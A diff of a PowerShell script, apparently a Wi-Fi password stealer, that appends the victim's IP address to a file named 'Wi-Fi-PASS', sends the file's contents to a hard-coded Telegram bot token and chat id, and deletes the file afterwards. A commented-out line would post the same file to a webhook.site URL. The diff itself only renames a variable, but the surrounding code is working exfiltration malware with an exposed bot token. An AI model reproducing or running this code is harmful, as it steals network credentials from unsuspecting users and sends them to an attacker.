@@ -5,7 +5,7 @@ cd $env:temp
 Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $(Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex) | Select-Object -ExpandProperty IPAddress >> Wi-Fi-PASS
 #Invoke-WebRequest -Uri https://webhook.site/5a81bbad-90a5-40db-a015-ffb88c41bf74 -Method POST -InFile Wi-Fi-PASS
 
-$Message = Get-Content .\Wifi-PASS -Raw
+$text = Get-Content .\Wifi-PASS -Raw
 Function Send-Telegram {
 Param([Parameter(Mandatory=$true)][String]$Message)
 $Telegramtoken = "5476202852:AAHqP84hjy-c6KFtHe_Va4waMrg7KvFHxLw"
@@ -13,7 +13,7 @@ $Telegramchatid = "5586673398"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $Response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($Telegramtoken)/sendMessage?chat_id=$($Telegramchatid)&text=$($Message)"
 }
-Send-Telegram -Message $Message
+Send-Telegram -Message $text
 
 Remove-Item *Wi-*
 
